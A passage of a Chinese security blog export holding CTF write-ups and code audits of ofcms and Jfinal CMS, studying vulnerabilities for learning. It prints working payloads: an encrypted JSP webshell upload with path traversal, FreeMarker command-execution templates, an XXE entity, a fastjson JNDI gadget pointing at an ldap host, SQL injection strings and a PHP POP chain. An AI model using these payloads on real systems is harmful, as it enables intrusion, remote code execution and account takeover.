$_SERVER[\"REMOTE_ADDR\"]);    @mkdir($sandbox);    @chdir($sandbox);    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));    $info = pathinfo($_GET[\"filename\"]);    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[\"basename\"]), $data);    highlight_file(__FILE__);\n\n得到一份源代码，那肯定是先进行代码审计\n代码审计&lt;?php    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123;\t\t# explode 使用一个字符串分割另一个字符串        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];    &#125;    echo $_SERVER[\"REMOTE_ADDR\"];\t# $sandbox 的值为 sanbox/(orange36.18.121.204 md5加密后的值)    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\t# 以$sandbox的值创建路径    @mkdir($sandbox);\t# 进入路径    @chdir($sandbox);\t# shell_exec 执行命令\t# escapeshellarg 把字符串转码为可以在 shell 命令里使用的参数\t#     $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\t# 返回文件路径的信息 文件名可以通过GET[\"filename\"]传参    $info = pathinfo($_GET[\"filename\"]);\t# basename($info[\"dirname\"])\t# basename 返回路径中的文件名部分\t# $info[\"dirname\"] 返回路径中的目录部分\t# 将 xxx 字符串中的 .  替换成 ''    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\t# 创建文件夹    @mkdir($dir);\t# 进入文件夹    @chdir($dir);\t# 写入文件\t# 将$data 写入 basename($info[\"basename\"] 文件中    @file_put_contents(basename($info[\"basename\"]), $data);    highlight_file(__FILE__);\n\n这道代码的作用：通过sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])创建了一个沙盒目录，然后$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));执行GET命令，参数由外部$_GET[&quot;url&quot;]传参，外部$info = pathinfo($_GET[&quot;filename&quot;]);传入文件名，将GET命令执行结果写入文件中file_put_contents(basename($info[&quot;basename&quot;]), $data);。\n分析完后首先想到的就是，在vps上绑定一句话木马进行监听，然后通过GET命令去请求，用$_GET[“filename”]传入的值作为文件名保存。\n在服务器上写上一句话目标，然后保存。\n用python启动一个http服务\npython3 -m http.server\n\n\n构造pyalod进行请求\n?url=121.4.xx.xx:8000/shell.php&amp;filename=shell.php\n\n接下来需要去沙盒路径下访问刚刚写入的文件 shell.php\n路径的构造规则 sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])在页面中回显的ip 36.18.121.204 通过 md5 加密 orange36.18.121.204 得到 d23635209b921a91099a3d5b85be6af2拼接 sandbox/d23635209b921a91099a3d5b85be6af2\n\n访问 sandbox/d23635209b921a91099a3d5b85be6af2/shell.php \nPOST 提交 phpinfo()\n\n蚁剑启动\n\n根目录下看到flag，双击打不开\n切换到终端，执行./readflag ，成功拿到flag\n\n第二种方式利用GET命令的一个漏洞，GET命令是用perl来执行，而prel的open可以执行命令，这里都是看别人wp才知道的，说得都是云里雾里，直接进行演示。\n用GET 执行命令 （先创建文件才执行GET才能成功）\ntouch &apos;ls|&apos;GET &quot;file:ls|&quot;\n\n┌──(kali㉿kali)-[/tmp]└─$ touch &apos;ls|&apos;                                                                                                                 ┌──(kali㉿kali)-[/tmp]└─$ GET &quot;file:ls|&quot;fcitx-socket-:0ls|ssh-jMvsHCg3mID2systemd-private-344dd432807142dd8950d423318f82d0-colord.service-ysjeOfsystemd-private-344dd432807142dd8950d423318f82d0-haveged.service-k1bxPfsystemd-private-344dd432807142dd8950d423318f82d0-ModemManager.service-p6Qjyhsystemd-private-344dd432807142dd8950d423318f82d0-systemd-logind.service-IpdMMhsystemd-private-344dd432807142dd8950d423318f82d0-upower.service-re1qdfVMwareDnDvmware-root_437-1849036237\n\n在kali中，要让命令执行生效，需要在 /usr/share/perl5/LWP/Protocol/file.pm 文件中，将 open(my $fh,&#39;&lt;&#39;, $path) or return new 修改为open(my $fh, $path) or return new。\n构造payload拿flag\n先执行两遍\n?url=file:bash -c /readflag|&amp;filename=bash -c /readfla\n\n在访问 /sandbox/d23635209b921a91099a3d5b85be6af2/bash -c /readflag|\n\n总结对这道题处于一种，啊，这就是ssrf题吗。平时ssrf做得很少，现在要是问我，什么是ssrf，我会回答，服务端请求伪造，但是要我说个案例，我就说不上来。这道题给我的提升就是知道GET命令的漏洞以及利用方式。\n","categories":["CTF","BUUCTF"],"tags":["CTF","SSRF"]},{"title":"【Java代码审计】ofcms 1.1.3","url":"/2022/10/09/%5BJava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Dofcms%201.1.3/","content":"写在前面通过审计一些简单的源码学习代码审计。在审计过程感觉还是有很多代码看不懂，不管那么多了，先审起来。\n后台sql注入漏洞漏洞复现登录后台后，在系统设置-&gt;代码生成-&gt;添加中输入如下payload\nupdate of_cms_ad set ad_id=updatexml(1, concat(0x7e, (database()),0x7e),1);\n\n\n\n\n\n\n\n\n可以看到成功爆出了数据库名。\n漏洞分析\n\n\n\n\n\n\n通过burp抓包，可以看到请求的路由。\n在IDEA中 全局搜索system/generate\n\n\n\n\n\n\n\n可以找到处理这个路由的类文件，在这个文件的45行可以看到一个create方法，刚刚的路由就是调用这个方法。\n\n\n\n\n\n\n\n这里的getPara获取了传入的sql语句\n\n\n\n\n\n\n\n接下来，跟进Db.update中。\n\n\n\n\n\n\n\n继续跟进\n\n\n\n\n\n\n\n继续跟进\n\n\n\n\n\n\n\n这里先是建立了一个数据库连接，然后再次调用了update方法，继续跟进\n\n\n\n\n\n\n\n这里就是比较关键的地方了，conn.prepareStatement是用来预编译sql语句的，executeUpdate 则是可以执行sql语句。\n预编译通常都是先构造一个sql语句，然后需要传入的参数用?代替，然后挨个放进去，目的就是为了预防sql注入。但是这整条sql语句我们都能够控制。预编译根本没起到什么作用，也没有对sql做过滤，所以可以自己构造update报错语句进行报错注入。\n任意文件上传2漏洞复现\n\n\n\n\n\n\n这里先上传一个 文件后缀为 图片格式 png 的 jsp webshell，然后抓包。\n\n\n\n\n\n\n\n当上传gif后缀格式的时候，是可以上传成功的。\n\n\n\n\n\n\n\n但是上传jsp后缀格式就不行，由于是在windows下，使用::$DATA后缀绕过上传\n\n\n\n\n\n\n\n在来看看上传文件目录下\n\n\n\n\n\n\n\n当然，如果直接访问是访问不了的\n漏洞分析还是通过burp抓包，查看请求的路由\n\n\n\n\n\n\n\n全局搜索comn/service\n\n\n\n\n\n\n\n在ComnController文件的101行\n\n\n\n\n\n\n\n上面是文件上传的逻辑，jfinal 使用 getFile进行文件上传，跟进getFile\n\n\n\n\n\n\n\n再次跟进\n\n\n\n\n\n\n\n跟进 MultipartRequest类\n\n\n\n\n\n\n\n跟进wrapMultipartRequest方法\n\n\n\n\n\n\n\n在86行调用了一个 isSafeFile的方法\n\n\n\n\n\n\n\n这里拿到了上传文件的文件名，去重并转换成小写，然后判断文件名末尾是否为.jsp或.jspx，如果是则返回flase，就不进行上传。\n但是在windows下，绕过的方式可以用shell.jsp::$DATA或在文件名末尾加.，比如shell.jsp. 都会保存为shell.jsp\n任意文件上传2漏洞复现\n\n\n\n\n\n\n在系统设置-&gt;模板文件中，点击保存，然后burp抓包\n\n\n\n\n\n\n\n这里将 dirs 改成 ../../../static , file_name改成shell.jsp ,file_content改成jsp冰蝎马\nfile_path=E%3A%5CTools%5CEnv%5Capache-tomcat-8.5.73%5Cwebapps%5Cofcms_admin%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&amp;dirs=../../../static&amp;res_path=&amp;file_name=shell.jsp&amp;file_content=&lt;jsp%3aroot+xmlns%3ajsp%3d&quot;http%3a//java.sun.com/JSP/Page&quot;+version%3d&quot;1.2&quot;&gt;&lt;jsp%3adirective.page+import%3d&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp%3adeclaration&gt;+class+U+extends+ClassLoader&#123;U(ClassLoader+c)&#123;super(c)%3b&#125;public+Class+g(byte+[]b)&#123;return+super.defineClass(b,0,b.length)%3b&#125;&#125;&lt;/jsp%3adeclaration&gt;&lt;jsp%3ascriptlet&gt;String+k%3d&quot;e45e329feb5d925b&quot;%3bsession.putValue(&quot;u&quot;,k)%3bCipher+c%3dCipher.getInstance(&quot;AES&quot;)%3bc.init(2,new+SecretKeySpec((session.getValue(&quot;u&quot;)%2b&quot;&quot;).getBytes(),&quot;AES&quot;))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b&lt;/jsp%3ascriptlet&gt;&lt;/jsp%3aroot&gt;\n\n\n\n\n\n\n\n\n在ofcms_admin\\static下\n\n\n\n\n\n\n\n可以看到已经成功上传，直接用冰蝎连接\n\n\n\n\n\n\n\n成功拿下\n漏洞分析通过burp抓包可以路由为/ofcms_admin/admin/cms/template/save.json\n在TemplateController.java文件中\n\n\n\n\n\n\n\n在107行\n\n\n\n\n\n\n\n简单分析下，这里可以通过外部控制 res_path dirs file_name file_content这四个参数。\nfileContent = fileContent.replace(&quot;&amp;lt;&quot;, &quot;&lt;&quot;).replace(&quot;&amp;gt;&quot;, &quot;&gt;&quot;); File file = new File(pathFile, fileName); // 创建文件  文件路径 文件名可控FileUtils.writeString(file, fileContent); // 将内容写入文件中  文件内容可控\n\n经过分析，相当于是文件路径和文件名还有文件内容我们都可以控制，并且没有对文件名和文件内容进行限制，想传入什么都可以。而且文件路径还可以通过../../进行目录穿越，可以实现将文件传入到任意目录下。\npathFile = new File(SystemUtile.getSiteTemplatePath());\n\n这条语句则会得到一个基础路径，通过debug可以得知\n\n\n\n\n\n\n\n通过测试，可以访问到网站跟目录下的static下的资源文件，可以控制dirs为 ../../../static 将冰蝎传入到static目录下，冰蝎链接，即可拿下。\n模板注入漏洞复现\n\n\n\n\n\n\n任选一个payload放在模板文件的任意位置。\n&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;\n\n&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;\n\n&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;\n\n然后让我一个不存在的文件，就会自动跳转到404页面，然后弹出计算器。\n\n\n\n\n\n\n\n漏洞分析这里的原理也很简单，这套网站使用了freemarker作为模板语言，并且我们还能控制网页模板文件，因此，只要能控制网页的地方，都可以将&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${value(&quot;calc.exe&quot;)} 执行命令的语句嵌入到网页中，然后访问就会执行。\n\n\n\n\n\n\n\nXML注入漏洞复现首先在本地用python起一个http监听\n\n\n\n\n\n\n\n然后通过上面任意文件上传2的方式上传一个后缀为jrxml格式的文件\nssrf.jrxml内容\n&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:8000/secret_pass.txt&quot;&gt;%xxe;]&gt;\n\ndata\nfile_path=E%3A%5CTools%5CEnv%5Capache-tomcat-8.5.73%5Cwebapps%5Cofcms_admin%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&amp;dirs=../../&amp;res_path=&amp;file_name=ssrf.jrxml&amp;file_content=&lt;!DOCTYPE+foo+[&lt;!ENTITY+%25+xxe+SYSTEM+&quot;http%3a//127.0.0.1/secret_pass.txt&quot;&gt;%25xxe%3b]&gt;\n\n\n\n\n\n\n\n\n然后再访问用户管理-&gt;系统设置-&gt;导出全部，并抓包\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n发送到Repeater，修改j的参数为 ../ssrf 并提交\n\n\n\n\n\n\n\npython收到了请求\n\n\n\n\n\n\n\n漏洞分析根据路由report找到 ReprotAction.java\n\n\n\n\n\n\n\n这段代码的功能就是用来导出报表的，前端可以传入参数j 可以控制读取 jrxml文件。\n假设j传入的是ssrf， 那么 jrxmlFileName 变量得到的路径就是\n/WEB-INF/jrxml/ssrf.jrxml\n\n如果传入 ../ssrf 那么就会加载 WEB-INF目录下的ssrf.jrxml文件，所以通过目录穿越的方式，可以加载任意路径下的jrxml文件\n/WEB-INF/jrxml/../ssrf.jrxml\n\n但是只是加载任意路径下的jrxml 文件，有有什么用呢？\n接下来，在46行中 \n\n\n\n\n\n\n\n跟入compileReport\n\n\n\n\n\n\n\n继续跟入\n\n\n\n\n\n\n\n这里的 JRXmlLoader.load(inputStream)这个方法 则可以解析 jrxml。而这里的inputStream 参数就是，刚刚通过j传入的文件名，然后进行拼接后打开文件流，只要能上传一个通过精心构造一个jrxml文件，那么就可以实现ssrf，读取文件。但是这里不会回显读取后的结果，所以只能构造一个实现ssrf jrxml文件。\n&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:8000/secret_pass.txt&quot;&gt;%xxe;]&gt;\n\n这里就利用了任意文件上传2中保存模板的方式在任意一个路径下，让后修改j的参数去路径下读取，即可加载到这个jrxml文件，实现ssrf攻击。\n任意用户密码重置漏洞复现创建一个test用户，并登录到test\n\n\n\n\n\n\n\n修改密码\n\n\n\n\n\n\n\n然后抓包\n\n\n\n\n\n\n\n发送到Repeater，修改user_id 的参数为1，即可修改管理员 admin密码 为 666666\n\n\n\n\n\n\n\n接下来 登录到 admin\n\n\n\n\n\n\n\n成功登录\n漏洞分析根据密码重置的路由 /ofcms_admin/admin/system/user/respwd.json 在源码中找到SysUserController.java\n\n\n\n\n\n\n\n在 109行\n\n\n\n\n\n\n\n在 respwd这个方法当中，首先会拿到两次输入的密码进行比对，如果不一致则直接返回，一致则将密码进行Sha256Hash进行加密然后set到Record这个对象中，这个Record对象就是封装了一个Map对象，可以对其进行get，set，最关键的一个地方就是，下面还获取了user_id 也并设置到Record对象中。然后执行Db.update。这里以user_id作为更新条件 从 record中去获取user_id，然后record中的user_id的其实就是外部传入的user_id。所以才可以通过控制user_id来重置任意用户密码。\n到此就结束了，在审计的过程当中，有很多代码我都读不懂，读不懂的原因是因为使用了开发框架，没有去使用过，所以看起来很费劲。\n","categories":["代码审计"],"tags":["java代码审计"]},{"title":"【Java代码审计】Jfinal CMS","url":"/2022/10/07/%5BJava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5DJfinal%20CMS/","content":"写在前面学习代码审计，为了练手，在CNVD上找了一个存在漏洞的Jfinal CMS的系统来审计，Jfinal CMS 5.0.1这个版本中在存在一个fastjson反序列漏洞，但是需要登录到后台，而且套代码使用的人并不是很多，所以危害并不大。Jfinal CMS 5.1.0 则存在大量的sql注入漏洞，目前这个版本也是最新版。\nCMS命令注入漏洞环境Jfinal CMS 5.0.1\n分析过程\n\n\n\n\n\n\n只是为了记录，省略部署过程。\n在com.jflyfox.component.controller.Ueditor\n\n\n\n\n\n\n\n进入到ActionEnter类中\n\n\n\n\n\n\n\nActionEnter类的初始化方法中调用了ConfigManager.getInstance，进入ConfigManager\n\n\n\n\n\n\n\ngetInstance 创建了一个ConfigManager,跟进ConfigManager中\n\n\n\n\n\n\n\n调用了this.initEnv方法，继续跟进\n\n\n\n\n\n\n\n可以看到在该方法中调用了JSONObject.parseObject，将json格式的字符串转换成对象。而该源码中使用的fastjson版本为1.2.28。\n\n\n\n\n\n\n\n在https://mvnrepository.com/网站中可以知道是存在fastjson反序列化漏洞的\n\n\n\n\n\n\n\n而在JSONObject jsonConfig = JSONObject.parseObject(configContent);这条触发fastjson反序列化语句中，我们需要控制configContent的值，来触发反序列化。\n\n\n\n\n\n\n\n可以通过点入ConfigManager.configFileName查看读取的文件名\n\n\n\n\n\n\n\n这个文件就是src/main/resources/config.json文件\n怎么去控制这个文件呢？\n通过用户名admin 密码 admin123进入后台\n\n\n\n\n\n\n\n在本地准备一个内容为以下，文件名为config.json的文件\n&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://ip:1389/xxx&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;\n\n在服务器起一个JNDI服务\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc.exe&quot; -A ip\n\n替换成上面构造的即可\n\n\n\n\n\n\n\n接下来，只需要找一个会访问/ueditor的路由,就会弹出计算器\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成功执行。\nJfinal SQL注入漏洞环境Jfinal CMS 5.0.1\n分析过程\n\n\n\n\n\n\n按Shift+Ctrl+R 全局搜索/system/dict\n\n\n\n\n\n\n\n存在漏洞的点\n\n\n\n\n\n\n\n可以看到，拿到了attrVal和orderBy并未经过任何过滤，直接就 append追加到sql语句中去了。\n在这个页面中\n\n\n\n\n\n\n\n抓个包\n\n\n\n\n\n\n\n什么都没有\n\n\n\n\n\n\n\n随便点一下\n\n\n\n\n\n\n\n测试\nor+extractvalue(1,concat(0x7e,(database())))#\n\n\n\n\n\n\n\n\n成功爆出了数据库名。\n以下路由的orderBy参数均存在sql注入\n/admin/advicefeedback/admin/article/admin/comment/admin/contact/admin/folder/admin/foldernotice/admin/folderrollpicture/admin/friendlylink/admin/imagealbum/admin/site/admin/videoalbum/admin/video/system/config/system/department/system/dict/system/log/system/menu/system/role/system/user\n\n","categories":["代码审计"],"tags":["java代码审计"]},{"title":"BUUCTF-WEB [HarekazeCTF2019]encode_and_encode 1","url":"/2021/10/10/%5BHarekazeCTF2019%5Dencode_and_encode%201/","content":"考点代码审计（json_decode特性绕过过滤）\n前置知识json_decode特性可以接收Unicode编码后的字符\n\n$js = json_decode('&#123;\"name\": \"\\u0068\\u0065\\u006c\\u006c\\u006f\"&#125;');print_r($js);//stdClass Object//(//    [name] =&gt; hello//)\n\nphp伪协议file:// \n用于访问文件（绝对路径、相对路径、网络路径）\nhttp://www.xx.com?file=file:///etc/passswd\n\nphp://\n访问输入输出流\nhttp://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）\n\n参数\nresource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。\n\nphp://input\nhttp://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;\n\n注意：enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的\ndata:// \n\n自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输\n\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n\n来源：https://www.cnblogs.com/wjrblogs/p/12285202.html\n解题过程打开 &lt;?phperror_reporting(0);if (isset($_GET['source'])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    '\\.\\.',    // no stream wrapper    '(php|file|glob|data|tp|zip|zlib|phar):',    // no data exfiltration    'flag'  ];  $regexp = '/' . implode('|', $banword) . '/i';  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) &#123;  $page = $json['page'];  $content = file_get_contents($page);  if (!$content || !is_valid($content)) &#123;    $content = \"&lt;p&gt;not found&lt;/p&gt;\\n\";  &#125;&#125; else &#123;  $content = '&lt;p&gt;invalid request&lt;/p&gt;';&#125;// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\&#123;.+\\&#125;/i', 'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;', $content);echo json_encode(['content' =&gt; $content]);\n\n分析这段代码的有类似与文件读取的功能，通过file_get_contents函数来读取。这个函数可以使用file://、php://filter、data://协议。但是这里有一个函数专门过滤了常用的php伪协议，还有flag字符。\n这个函数检测了两次，第一次检测输入的数据$body = file_get_contents(&#39;php://input&#39;);,第二次检测了被读取文件的数据$content = file_get_contents($page);。最后还有一个无关紧要的替换正则。那么怎么才能绕过这两个条件，读取到flag文件呢？\n这道题的解题的一个关键点，json_decode函数的特性，json_decode函数能够接收Unicode编码后的字符\n$js = json_decode(&apos;&#123;&quot;name&quot;: &quot;\\u0068\\u0065\\u006c\\u006c\\u006f&quot;&#125;&apos;);print_r($js);//stdClass Object//(//    [name] =&gt; hello//)\n\n上面这个if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;]))条件，只对$body进行了检测，并没有对$json检测，所以通过传入Unicode编码后的字符，is_valid就检测不出来。\n这里先构造\nfile:///etc/passwd\n\n&#123;&quot;page&quot;:&quot;\\u0066\\u0069\\u006c\\u0065\\u003a\\u002f\\u002f\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064&quot;&#125;\n\n\n回显{&quot;content&quot;:&quot;&lt;p&gt;not found&lt;\\/p&gt;\\n&quot;},猜测读取的内容当中存在is_valid函数过滤的字符。\n这里直接使用php://filter 协议进行base64编码后再输出\nphp://filter/read=convert.base64-encode/resource=/etc/passwd\n\n&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0072\\u0065\\u0061\\u0064\\u003d\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064&quot;&#125;\n\n回显\n\n读取flag直接读取flag\nphp://filter/read=convert.base64-encode/resource=/flag\n\n&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0072\\u0065\\u0061\\u0064\\u003d\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0066\\u006c\\u0061\\u0067&quot;&#125;\n\n\n解码\n\n总结这道题如果知道json_decode特性后，还算是一道比较简单的题，学到了。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","json_decode特性"]},{"title":"BUUCTF-WEB 【MRCTF2020】Ezpop 1","url":"/2021/04/18/%5BMRCTF2020%5DEzpop%201/","content":"反序列化题：POP链构造Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    # pop构造链 一般是从 可利用的地方 回溯到 可控制的地方    # 1. 可以看到 当前类有一个魔法方法 __invoke 当这个类 以调用函数的方式调用时 就会触发该方法  我们看看那个类的方法可以调用类    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;#class Show&#123;    public $source;    public $str;    public function __construct($file='index.php')&#123;        $this-&gt;source = $file;        echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";    &#125;    public function __toString()&#123;        # 4. Show类 的 __toString 方法 会返回一个 $this-&gt;str-&gt;source        # 可以把$this-&gt;str 属性 赋值成 Test类，这样就相当于，$this-&gt;str-&gt;source Test-&gt;source 也就相当于调用了一个不存在的属性        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) &#123;            echo \"hacker\";            $this-&gt;source = \"index.php\";        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    #    # 3. __get 这个魔法方法要怎么被调用呢 答案是 获取一个不存在的属性或者私有属性    public function __get($key)&#123;        $function = $this-&gt;p;        # 2. 发现在Test 类中可以调用一个自定义函数 用构造方法来创建一个类        return $function();    &#125;&#125;if(isset($_GET['pop']))&#123;    @unserialize($_GET['pop']);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;\n\n分析在Modifier 类中发现include 函数，可以通过php://filter 去读取flag.php源代码。\n最终我们要通过Modifier  的 append方法去包含flag.php的源代码。在Modifier 类中找到一个魔法方法__invoke() ，这个类能控制 append 方法，触发__invoke() 这个魔法方法的方式是以调用函数的方式去调用类。而在Test类中，存在一个__get 的魔法方法，有一条语句，return $function(); 并且$function可控制。而__get 触发方式是 调用一个不存在的属性或者私有属性 时，就会触发该方法。而在Show 类中存在__toString的魔法方法，return $this-&gt;str-&gt;source; 的$this-&gt;str可控制。\n构造如下\n&lt;?phpclass Modifier &#123;    protected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;#class Show&#123;    public $source;    public $str;    public function __construct($file='index.php')&#123;        $this-&gt;str = new Test();        $this-&gt;source = $file;        echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source.\"\";    &#125;    public function __wakeup()&#123;        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) &#123;            echo \"hacker\";            $this-&gt;source = \"index.php\";        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = new Modifier();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;$s1 = new Show();$s1 = new Show($s1);var_dump(urlencode(serialize($s1)));\n\n得到\nO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D\n\n提交\n\nPD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezIzN2Q3ODUzLWE3NDUtNGU4OS1hODk0LTFjODA4NGJkMzBmY30iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+\n\n解码\n\n在构造序列化的时候，创建了两次show对象，在之前都只是创建一次，而这里创建两次是因为创建一次的话，并不会调用到其他的类。\n一道题看一天，看下来，还是有些懵的感觉。\n","categories":["CTF","BUUCTF"],"tags":["反序列化","CTF"]},{"title":"BUUCTF-WEB 【NCTF2019】SQLi 1","url":"/2021/08/27/%5BNCTF2019%5DSQLi%201/","content":"考点sql注入（regexp注入）\n前置知识regexp注入\n在sql语句中\nselect database();  // 是输出当前打开的是数据库名\n\n\n\nselect database() regexp”^d”;  // 这样可以匹配数据库名的开头是 d \n是就会返回 1 不是则返回0\n\n\n\n\n当sql语句是这样\nselect * from users where user=’’||password; \n\n\n可以看到出来两条数据，至于为什么会出来两条数据，我很好奇，按理说 &#39;&#39;||password  为逻辑运算，结果 只能为1 或者 0 ，当user =0/1的时候，并没有字段能够满足，但还是查询出来两条数据？？？先不纠结这个，做题要紧。\n接下来 可以通过 &#39;&#39;||passwor dregexp&quot;^8d&quot; 的方式 不断匹配出数据当中 password的值。\n\n这个就是regexp注入。\n解题过程打开\n一个登录页面，还显示了提交的sql语句。\ndirsearch扫目录python3 dirsearch.py -u &quot;http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/&quot;  -x 404,429 -s 1\n\n\n可以得到一些提示信息，打开 robots.txt\n\n实际上提示的就是 hint.txt\n\n可以发现过滤了很多关键字，提示信息说只需要找到admin的密码 提交，然后就能拿到flag。\n这种题我也没做过，直接跟随大佬的脚步，看了wp，regexp注入。\n首先构造payload。\nusername=\\&amp;passwd=||passwd/**/regexp&quot;^y&quot;;%00\n\n为什么要这么构造呢？\n页面上回显的sql语句select * from users where username=&apos;&apos; and 